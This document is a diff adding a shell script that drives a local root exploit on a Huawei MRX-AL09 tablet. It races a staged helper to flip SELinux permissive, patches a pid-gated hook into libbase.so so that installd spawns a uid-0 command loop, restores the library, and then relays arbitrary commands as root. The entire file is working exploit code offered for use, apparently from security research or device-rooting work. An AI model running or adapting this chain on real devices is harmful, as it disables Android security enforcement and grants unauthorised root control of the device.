@@ -1,0 +1,98 @@
+#!/system/bin/sh
+# rshell -- on-device root shell for the Huawei MRX-AL09.  Run it inside
+# `adb shell` or Termux.  It (1) flips SELinux permissive, (2) brings up the
+# uid-0 / u:r:installd:s0 command channel, (3) reads commands from stdin.
+#
+#   sh /data/local/tmp/rshell                  # interactive
+#   sh /data/local/tmp/rshell 'id; getenforce' # one-shot
+#   SWITCH=0 sh /data/local/tmp/rshell         # skip the SELinux step
+#
+# Requires in /data/local/tmp (already staged, and persistent across reboot):
+#   mbsw  pcwrite2  hook_payload.bin  hook_branch.bin  r.sh
+#
+# Both per-boot: after a reboot the MAC switch is gone and the channel dies,
+# so just run this again.
+set -u
+D=/data/local/tmp
+LIB=/system/lib64/libbase.so
+PKG=${PKG:-com.neutronized.supercattales2}
+SWITCH=${SWITCH:-1}
+
+# run one command in the root channel; the daemon writes the answer to $D/out
+ch() {
+  rm -f "$D/out"
+  { echo "chmod 666 $D/out $D/hits 2>/dev/null"; printf '%s\n' "$1"; } > "$D/cmd"
+  i=0
+  while [ "$i" -lt 25 ]; do
+    [ -f "$D/out" ] && grep -q '^\[exit ' "$D/out" 2>/dev/null && break
+    sleep 1; i=$((i + 1))
+  done
+  cat "$D/out" 2>/dev/null
+}
+
+# pids of running channel loops (argv is exactly "sh /data/local/tmp/r.sh")
+loops() {
+  for p in /proc/[0-9]*; do
+    c=$({ tr '\0' ' ' < "$p/cmdline"; } 2>/dev/null)
+    case "$c" in "sh $D/r.sh"*) echo "${p#/proc/}";; esac
+  done
+}
+
+# --- 1. SELinux permissive -------------------------------------------------
+if [ "$SWITCH" = 1 ]; then
+  echo "[rshell] 1/2 SELinux permissive (mali_boot switch; ~80 s, race lottery)"
+  "$D/mbsw" switch 2>&1 | grep -E "MAC GRANTED|STILL DENIED|W1 ok|W2 ok|done rc"
+fi
+
+# --- 2. uid-0 installd channel ---------------------------------------------
+echo "[rshell] 2/2 installd channel"
+PID=$(pidof installd)
+[ -n "$PID" ] || { echo "[rshell] installd not running"; exit 1; }
+echo "[rshell] installd pid=$PID"
+
+# template the payload's pid gate: movz w1,#pid  (payload offset 0x20)
+insn=$(( 0x52800001 | ((PID & 0xffff) << 5) ))
+b0=$(( insn & 0xff )); b1=$(( (insn >> 8) & 0xff ))
+b2=$(( (insn >> 16) & 0xff )); b3=$(( (insn >> 24) & 0xff ))
+cp -f "$D/hook_payload.bin" "$D/hook_payload.run"
+printf "$(printf '\\%03o\\%03o\\%03o\\%03o' "$b0" "$b1" "$b2" "$b3")" \
+    > "$D/pid.bin" 2>/dev/null
+dd if="$D/pid.bin" of="$D/hook_payload.run" bs=1 seek=32 conv=notrunc \
+    2>/dev/null
+
+# keep the pristine bytes so the library can be restored
+dd if="$LIB" of="$D/lb_T_orig.bin" bs=1 skip=$((0xe6f4))  count=4    2>/dev/null
+dd if="$LIB" of="$D/lb_H_orig.bin" bs=1 skip=$((0x10418)) count=1024 2>/dev/null
+
+"$D/pcwrite2" "$LIB" 0x10418 "$D/hook_payload.run"
+"$D/pcwrite2" "$LIB" 0xe6f4  "$D/hook_branch.bin"
+cmd package compile -m speed -f "$PKG" >/dev/null 2>&1
+
+L=""
+i=0
+while [ "$i" -lt 30 ]; do
+  L=$(loops)
+  [ -n "$L" ] && break
+  sleep 1; i=$((i + 1))
+done
+[ -n "$L" ] || { echo "[rshell] hook did not fire (reboot and retry)"; exit 1; }
+
+# keep exactly one loop; the extras can only be signalled from the channel
+KEEP=$(echo "$L" | head -1)
+REST=$(echo "$L" | grep -v "^$KEEP\$" | tr '\n' ' ')
+[ -n "$(echo $REST)" ] && ch "kill -9 $REST" >/dev/null 2>&1
+
+"$D/pcwrite2" "$LIB" 0xe6f4  "$D/lb_T_orig.bin" >/dev/null
+"$D/pcwrite2" "$LIB" 0x10418 "$D/lb_H_orig.bin" >/dev/null
+echo "[rshell] channel pid $KEEP up (uid 0, u:r:installd:s0); libbase restored"
+
+# --- 3. use it -------------------------------------------------------------
+if [ "$#" -gt 0 ]; then
+  ch "$*"
+  exit 0
+fi
+while IFS= read -r line; do
+  [ -z "$line" ] && continue
+  case "$line" in exit|quit) break;; esac
+  ch "$line"
+done
